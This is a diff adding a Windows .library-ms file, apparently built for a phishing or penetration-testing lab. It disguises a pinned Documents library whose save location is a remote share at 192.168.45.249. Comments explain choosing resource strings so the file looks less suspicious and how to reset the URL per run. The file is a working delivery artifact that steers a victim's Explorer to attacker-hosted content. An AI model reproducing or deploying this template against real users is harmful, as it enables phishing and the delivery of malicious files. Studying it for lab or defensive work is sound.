@@ -1,0 +1,34 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<!-- We can use @shell32.dll,-34575 or @windows.storage.dll,-34582 as specified on the Microsoft website. Choose the latter because shell32.dll looks to suspecious-->
+<name>@windows.storage.dll,-34582</name>
+<version>6</version>
+<!-- Navigation bar and Icon. We can use imagesres.dll to choose between all Windows icons.  
+<iconReference>imageres.dll,-1002</iconReference> Documents folder icon.
+<iconReference>imageres.dll,-1003</iconReference> Pictures folder icon. 
+-->
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1003</iconReference>
+<!-- Document Folder Type
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType> Documents or
+<folderType>{B3690E58-E961-423B-B687-386EBFD83239}</folderType> Pictures
+-->
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+<!--
+Attention: 
+The URL is important part and it must be set once per execution.
+After execution the file gets manipulated by Windows.
+-->
+<searchConnectorDescriptionList>
+<searchConnectorDescription>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<isSupported>false</isSupported>
+<simpleLocation>
+<url>http://192.168.45.249/</url>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+
+</libraryDescription>
